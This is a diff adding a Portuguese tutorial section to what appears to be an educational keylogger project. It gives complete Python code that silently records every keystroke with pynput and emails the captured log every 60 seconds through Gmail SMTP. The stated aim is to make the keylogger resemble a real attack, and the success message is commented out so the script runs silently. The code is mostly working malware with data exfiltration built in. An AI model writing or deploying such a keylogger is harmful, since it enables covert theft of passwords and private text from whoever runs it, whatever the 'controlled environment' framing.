@@ -160,3 +160,99 @@ O objetivo é tornar o keylogger mais parecido como em um ataque real. Alem de r
 
     * [My Account Google](https://myaccount.google.com/apppassword)
 
+### Passo 2:
+Exportando os dados em um ambiente controlado
+
+1. Utilização da biblioteca SMTPLIB
+    * pip install secure-smtplib
+
+2. Código de utilização
+    * criação do arquivo keylogger_email.py
+
+3. Explicação do código
+
+### 1 - Importações e Configurações Iniciais
+
+Importa as bibliotecas necessárias e configura as credenciais para o envio de e-mail.
+
+```python
+
+from pynput import keyboard # Para monitorar o teclado
+import smtplib             # Para enviar e-mails via SMTP
+from email.mime.text import MIMEText # Para criar a mensagem de e-mail
+from threading import Timer # Para agendar tarefas em segundo plano (envio periódico)
+
+# CONFIGURAÇÃO DE E-MAIL
+# ATENÇÃO: Para contas Gmail, você precisará usar uma "senha de app", não sua senha principal.
+EMAIL_ORIGEM = "exemplokeylogger@gmail.com" 
+EMAIL_DESTINO = "exemplokeylogger@gmail.com"
+SENHA_EMAIL = "senha@email-exemplo" # Use uma senha de app ou credencial específica
+
+log = "" # Variável global que armazena temporariamente as teclas capturadas
+
+```
+
+### 2 - Função de Envio de E-mail (enviar_email)
+Esta função é responsável por formatar e enviar o conteúdo do log por e-mail, utilizando o protocolo SMTP.
+
+```python
+def enviar_email():
+    global log
+    if log: # Envia apenas se houver algo capturado no log
+        msg = MIMEText(log)
+        msg['SUBJECT'] = "Dados capturados pelo keylogger"
+        msg['From'] = EMAIL_ORIGEM
+        msg['To'] = EMAIL_DESTINO
+
+        try:
+            # Conecta-se ao servidor SMTP do Gmail na porta 587
+            # O servidor correto do Gmail é "smtp.gmail.com" (seu código tinha um erro de digitação como "smpt.gmail.com")
+            server = smtplib.SMTP("smtp.gmail.com", 587) 
+            server.starttls() # Inicia a segurança TLS
+            server.login(EMAIL_ORIGEM, SENHA_EMAIL) # Autentica
+            server.send_message(msg) # Envia a mensagem
+            server.quit() # Desconecta
+            # print("E-mail enviado com sucesso.") # Linha comentada para rodar silenciosamente
+        
+        except Exception as e:
+            print("Erro ao enviar e-mail:", e)
+        
+        log = "" # Limpa o log local após o envio para evitar repetição de dados
+
+    # Agendar o próximo envio a cada 60 segundos (de forma recorrente)
+    Timer(60, enviar_email).start()
+```
+
+### 3- Função de Tratamento de Teclas Pressionadas (on_press)
+Esta função é chamada automaticamente pela biblioteca pynput toda vez que uma tecla é pressionada. Ela adiciona a tecla ao log global.
+
+```python
+def on_press(key):
+    global log
+    try:
+        # Tenta obter o caractere normal da tecla (ex: 'a', 'b', '1')
+        log += key.char 
+    except AttributeError:
+        # Se não for um caractere normal (ex: espaço, enter, shift), 
+        # trata as teclas especiais de forma personalizada
+        if key == keyboard.Key.space:
+            log += " "
+        elif key == keyboard.Key.enter:
+            log += "\n" # Adiciona uma quebra de linha
+        elif key == keyboard.Key.backspace:
+            log += "[<]" # Representa o backspace
+        else:
+            # Ignora outras teclas como Ctrl, Shift, Alt, F1-F12, etc.
+            pass 
+```
+### 4 - Execução Principal
+Configura o listener do teclado e inicia o processo de envio recorrente.
+
+```python
+# Cria um 'listener' que fica em um loop infinito aguardando eventos do teclado
+# e chama a função 'on_press' para cada evento.
+with keyboard.Listener(on_press=on_press) as listener:
+    enviar_email()   # Chama a função de envio pela primeira vez para iniciar o ciclo do Timer
+    listener.join()  # Mantém o script principal rodando enquanto o listener estiver ativo
+
+```
